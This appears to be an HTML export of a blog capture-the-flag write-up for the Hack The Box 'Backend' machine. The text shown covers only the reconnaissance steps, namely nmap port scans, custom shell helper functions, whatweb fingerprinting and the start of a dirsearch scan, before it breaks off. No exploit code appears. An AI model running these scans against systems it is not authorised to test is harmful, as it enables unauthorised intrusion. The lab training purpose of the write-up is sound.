<!DOCTYPE html> <html lang="es"><head>
<title>Machine Backend</title>
<base href=".">
<script src="https://kmn9.github.io/theopendoor/site-lib/scripts/copy-commands.js"></script>
<meta name="pathname" content="machine-backend.html">
<meta name="description" content="Blog - Machine Backend">
<meta property="og:title" content="Machine Backend">
<meta property="og:description" content="Blog - Machine Backend">
<meta property="og:type" content="website">
<meta property="og:url" content="machine-backend.html">
<meta property="og:image" content="img/pasted-image-20251125132509.png">
<meta charset="UTF-8"><meta property="og:site_name" content="Blog"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0"><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="site-lib/rss.xml"><script async="" id="webpage-script" src="site-lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="site-lib/media/favicon.png"><link rel="stylesheet" href="site-lib/styles/obsidian.css"><link rel="stylesheet" href="site-lib/styles/theme.css"><link rel="preload" href="site-lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="site-lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/main-styles.css"></noscript><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-vertical-spacing:1.3em;--sidebar-margin:12px}:root{background-color:#202124}.sidebar{height:100%;font-size:14px;z-index:10;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));position:relative;overflow:hidden;overflow:clip;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}#left-sidebar{left:0}#right-sidebar{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}.sidebar.floating{position:absolute}.sidebar .leaf-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .leaf-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}#left-sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}#right-sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar #left-sidebar-content,.sidebar #right-sidebar-content{contain:none!important;container-type:normal!important;animation:none!important}.sidebar:has(.leaf-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:calc(2.3em + 2 * var(--sidebar-margin));width:var(--sidebar-width);padding:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}#left-sidebar .sidebar-topbar{left:0;flex-direction:row;border-top-right-radius:var(--radius-l)}#right-sidebar .sidebar-topbar{right:0;flex-direction:row-reverse;border-top-left-radius:var(--radius-l)}#left-sidebar .topbar-content{margin-right:calc(2.3em + var(--sidebar-margin));flex-direction:row}#right-sidebar .topbar-content{margin-left:calc(2.3em + var(--sidebar-margin));flex-direction:row-reverse}.topbar-content{overflow:hidden visible;overflow:clip visible;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:2px!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}#left-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}#right-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.feature-title{margin-left:1px;text-transform:uppercase;letter-spacing:.06em;margin-top:.75em;margin-bottom:.75em}.feature-header{display:flex;align-items:center;padding-top:0;font-size:1em;padding-left:0}body.floating-sidebars .sidebar{position:absolute}body{transition:background-color var(--color-fade-speed) ease-in-out}#navbar:not(:empty){display:flex;align-items:center;justify-content:space-between;padding:.5em 1em;width:100%}#main{display:flex;flex-direction:column;height:100%;width:100%;align-items:stretch;justify-content:center}#main-horizontal{display:flex;flex-direction:row;flex-grow:1;width:100%;align-items:stretch;justify-content:center}#center-content{flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0!important;transition:opacity .2s ease-in-out;pointer-events:none}#center-content>.obsidian-document{padding-left:2em;padding-right:1em;margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}body #center-content>.obsidian-document>.markdown-preview-sizer{padding-bottom:80vh;width:100%;max-width:var(--line-width);flex-basis:var(--line-width);transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document>div{width:100%!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document:not([data-type=markdown]).embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}#center-content>.obsidian-document:not([data-type=markdown]).embed>*{max-width:100%;max-height:100%;object-fit:contain}:not(h1,h2,h3,h4,h5,h6,li):has(> :is(.math,table)){overflow-x:auto!important}#center-content>.obsidian-document:not([data-type=markdown]){overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.obsidian-document[data-type=attachment]{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;width:100%}.obsidian-document[data-type=attachment]>*{outline:0;border:none;box-shadow:none}.obsidian-document[data-type=attachment] :is(img){max-width:90%;max-height:90%;object-fit:contain}.obsidian-document[data-type=attachment]>:is(audio){width:100%;max-width:min(90%,var(--line-width))}.obsidian-document[data-type=attachment]>:is(embed,iframe,video){width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain}.canvas-wrapper>:is(.header,.footer){z-index:100;position:absolute;display:flex;justify-content:center;flex-direction:column;width:100%;align-items:center}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){let e=document.querySelectorAll("link[itemprop='include']");for(const t of e){let e=t.getAttribute("href");try{let o="";if(e.startsWith("https:")||e.startsWith("http:")||"file:"!=window.location.protocol){const n=await fetch(e);if(!n.ok){console.log("Could not include file: "+e),t?.remove();continue}o=await n.text()}else{const t=document.getElementById(btoa(encodeURI(e)));if(t){const e=JSON.parse(decodeURI(atob(t.getAttribute("value")??"")));o=e?.data??""}}let n=document.createRange().createContextualFragment(o);t.before(n),t.remove(),console.log("Included text: "+o),console.log("Included file: "+e)}catch(o){t?.remove(),console.log("Could not include file: "+e,o);continue}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script")));!function e(n){let l=o[n],c=n+1;l?(l&&"true"!=l.getAttribute("loaded")||n<o.length&&e(c),n<o.length&&l.addEventListener("load",(()=>e(c)))):n<o.length?e(c):t()}(0)}</script></head><a href="https://kmn9.github.io/theopendoor/index.html" style="position:fixed;top:10px;left:10px;z-index:9999;background:rgba(30,30,30,0.8);backdrop-filter:blur(6px);color:#fff;padding:8px 14px;border-radius:50px;text-decoration:none;font-family:'Inter',sans-serif;font-size:14px;line-height:1;box-shadow:0 4px 12px rgba(0,0,0,0.25);transition:all 0.3s ease;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:6px;" onmouseover="this.style.background='rgba(60,60,60,0.85)';" onmouseout="this.style.background='rgba(30,30,30,0.8)';" onclick="this.blur();" >←<span style='display:none;@media(min-width:600px){display:inline;}'> Back to main page</span></a><body class="publish css-settings-manager styled-scrollbars show-inline-title show-ribbon is-focused"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="parsed-feature-container" style="display: contents;"><link itemprop="include" href="site-lib/html/custom-head-content-content.html"></div><div id="main"><div id="navbar"></div><div id="main-horizontal"><div id="left-content" class="leaf" style="--sidebar-width: var(--sidebar-width-left);"><div id="left-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="left-sidebar-content" class="leaf-content"></div></div><script defer="">let ls = document.querySelector("#left-sidebar"); ls.classList.toggle("is-collapsed", window.innerWidth < 768); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div></div><div id="center-content" class="leaf"><div class="obsidian-document markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings allow-fold-lists show-indentation-guide show-properties" data-type="markdown"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="header"><h1 class="page-title heading inline-title" id="Machine_Backend_0">Machine Backend</h1><div class="data-bar"></div></div><div class="markdown-preview-pusher" style="width: 1px; height: 0.1px; margin-bottom: 0px;"></div><div class="el-hr"><hr></div><div class="el-p"><p dir="auto">Tags: <a href="?query=tag:machine" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#machine">#machine</a> <a href="?query=tag:htb" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#htb">#htb</a> <a href="?query=tag:medium" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#medium">#medium</a> <a href="?query=tag:linux" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#linux">#linux</a> <a href="?query=tag:oscp" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#oscp">#oscp</a> <a href="?query=tag:jwt_abuse" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#jwt_abuse">#jwt_abuse</a> <a href="?query=tag:api_abuse" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#api_abuse">#api_abuse</a> <a href="?query=tag:api_enumeration" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#api_enumeration">#api_enumeration</a> <a href="?query=tag:lfi" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#lfi">#lfi</a> <a href="?query=tag:rce" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#rce">#rce</a> <a href="?query=tag:privilege_escalation" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#privilege_escalation">#privilege_escalation</a> </p></div><div class="el-hr"><hr></div><div class="el-h1"><h1 data-heading="Information Gathering" dir="auto" class="heading" id="Information_Gathering_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Information Gathering</h1></div><div class="el-h2"><h2 data-heading="Discovering OS via TTL Using `ping`" dir="auto" class="heading" id="Discovering_OS_via_TTL_Using_`ping`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Discovering OS via TTL Using <code>ping</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token number">10.10</span>.11.161
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251125132509.png" src="img/pasted-image-20251125132509.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251125132509.png" src="img/pasted-image-20251125132509.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Based on the <code>TTL</code> values obtained from the <code>ping</code> command, the operating system of the victim machine was identified as <code>Linux</code>. Typically, a <code>TTL</code> value below <code>64</code> corresponds to <code>Linux</code> systems, whereas a <code>TTL</code> between <code>65</code> and <code>128</code> indicates a <code>Windows</code> system. Next, a <code>UDP</code> port scan will be performed.</p></div><div class="el-h2"><h2 data-heading="UDP Port Scan Using `nmap`" dir="auto" class="heading" id="UDP_Port_Scan_Using_`nmap`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>UDP Port Scan Using <code>nmap</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">nmap <span class="token parameter variable">-sU</span> --min-rate <span class="token number">5000</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">--open</span> --top-ports <span class="token number">100</span> <span class="token number">10.10</span>.11.161 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'no-response'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251125132532.png" src="img/pasted-image-20251125132532.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251125132532.png" src="img/pasted-image-20251125132532.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>UDP</code> port scan has concluded and no open ports were found. Next, another scan will be carried out to discover open <code>TCP</code> ports.</p></div><div class="el-h2"><h2 data-heading="TCP Port Scan Using a Custom `.zshrc` Function (`jmap`)" dir="auto" class="heading" id="TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port Scan Using a Custom <code>.zshrc</code> Function (<code>jmap</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">jmap
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251125132703.png" src="img/pasted-image-20251125132703.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251125132703.png" src="img/pasted-image-20251125132703.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cat</span><span class="token operator">=</span><span class="token string">"batcat --paging=never"</span>

<span class="token function-name function">jmap</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>[+] Introduce una IP<span class="token entity" title="\n">\n</span>"</span>
        <span class="token builtin class-name">read</span> <span class="token function">ip</span>
        <span class="token builtin class-name">echo</span>
        <span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> -p- --min-rate <span class="token number">5000</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">--open</span> <span class="token variable">$ip</span> <span class="token parameter variable">-oG</span> scan <span class="token operator">|</span> <span class="token function">cat</span> <span class="token parameter variable">-l</span> <span class="token function">java</span>
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Using a custom function named <code>jmap</code>, previously defined in the <code>.zshrc</code>, the <code>TCP</code> scan was conducted, revealing that ports <code>22 (SSH)</code> and <code>80 (HTTP)</code> were open, providing valuable context about the target machine. Following this discovery, a more detailed scan will be performed against the identified ports:</p></div><div class="el-h2"><h2 data-heading="Represent Scan Information Legibly Using  a `.zshrc` Custom Function (`extractPorts`)" dir="auto" class="heading" id="Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Represent Scan Information Legibly Using  a <code>.zshrc</code> Custom Function (<code>extractPorts</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">extractPorts scan
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251125132733.png" src="img/pasted-image-20251125132733.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251125132733.png" src="img/pasted-image-20251125132733.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">extractPorts</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Extracting information..."</span>
        
        <span class="token assign-left variable">ip_address</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'Host: \K\S+'</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">1</span><span class="token variable">)</span></span> 

        <span class="token assign-left variable">ports</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'\d+(?=/open)'</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'\n'</span> <span class="token string">','</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/,$/\n/'</span><span class="token variable">)</span></span> 
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"IP Address: <span class="token variable">$ip_address</span>"</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Open ports: <span class="token variable">$ports</span><span class="token entity" title="\n">\n</span>"</span>
        <span class="token punctuation">{</span>
                <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"IP Address: <span class="token variable">$ip_address</span>"</span>
                <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Open ports: <span class="token variable">$ports</span><span class="token entity" title="\n">\n</span>"</span>
        <span class="token punctuation">}</span> <span class="token operator">&gt;&gt;</span> extractPorts.tmp
        <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$ports</span>"</span> <span class="token operator">|</span> xclip <span class="token parameter variable">-sel</span> clip
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Ports copied to clipboard<span class="token entity" title="\n">\n</span>"</span>
        <span class="token function">cat</span> extractPorts.tmp
        <span class="token function">rm</span> extractPorts.tmp
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The function shown in the image <code>extractPorts</code>, also previously defined in the <code>.zshrc</code>, displays the information from the previous scan and copies the ports to the clipboard. This makes it easier to perform a second scan on the discovered ports, especially when there are many.</p></div><div class="el-h2"><h2 data-heading="Discovering Service Versions on Open TCP Ports Using a `.zshrc` Custom Function (`jmap2`)" dir="auto" class="heading" id="Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Discovering Service Versions on Open TCP Ports Using a <code>.zshrc</code> Custom Function (<code>jmap2</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">jmap2
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251125132759.png" src="img/pasted-image-20251125132759.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251125132759.png" src="img/pasted-image-20251125132759.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cat</span><span class="token operator">=</span><span class="token string">"batcat --paging=never"</span> 

<span class="token function-name function">jmap2</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$#</span>"</span> <span class="token parameter variable">-ne</span> <span class="token number">2</span> <span class="token punctuation">]</span>
        <span class="token keyword">then</span>
                <span class="token builtin class-name">echo</span> <span class="token string">"Uso: jmap2 &lt;ip&gt; &lt;ports&gt;"</span>
                <span class="token builtin class-name">return</span> <span class="token number">1</span>
        <span class="token keyword">fi</span>
        
        <span class="token builtin class-name">local</span> <span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span> 
        <span class="token builtin class-name">local</span> <span class="token assign-left variable">ports</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span> 
        nmap -p<span class="token string">"<span class="token variable">$ports</span>"</span> <span class="token parameter variable">-sCV</span> <span class="token string">"<span class="token variable">$ip</span>"</span> <span class="token operator">|</span> <span class="token function">cat</span> <span class="token parameter variable">-l</span> <span class="token function">java</span>
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The <code>jmap2</code> function, also predefined in the <code>.zshrc</code>, was used to perform a targeted scan on the previously identified ports. This scan aimed to enumerate the running services and their versions, as well as to apply basic reconnaissance scripts against those services. The results did not reveal any valuable information. Next, the technologies used by the web service will be enumerated:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Identifying Technologies and Services on the Web Service Using `whatweb` &amp; `wappalyzer`" dir="auto" class="heading" id="TCP_Port_80_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Identifying Technologies and Services on the Web Service Using <code>whatweb</code> &amp; <code>wappalyzer</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">whatweb <span class="token number">10.10</span>.11.161
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251125132845.png" src="img/pasted-image-20251125132845.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251125132845.png" src="img/pasted-image-20251125132845.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251125132926.png" src="img/pasted-image-20251125132926.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251125132926.png" src="img/pasted-image-20251125132926.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">By using <code>whatweb</code> and <code>wappalyzer</code>, we were able to identify the technologies running on the specified <code>HTTP</code> services. The technologies identified were the <code>Uvicorn</code> web server and the <code>Python</code> programming language. Additionally, the website displays a message related to an <code>API</code>; therefore, a scan to discover resources, paths, and <code>API</code> endpoints will be performed next:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Discovering Routes and Resources Using `dirsearch`" dir="auto" class="heading" id="TCP_Port_80_Discovering_Routes_and_Resources_Using_`dirsearch`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Discovering Routes and Resources Using <code>dirsearch</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">dirsearch <span class="token parameter variable">-u</span> http://10.10.11.161/ --exclude-status<span class="token operator">=</span><span class="token 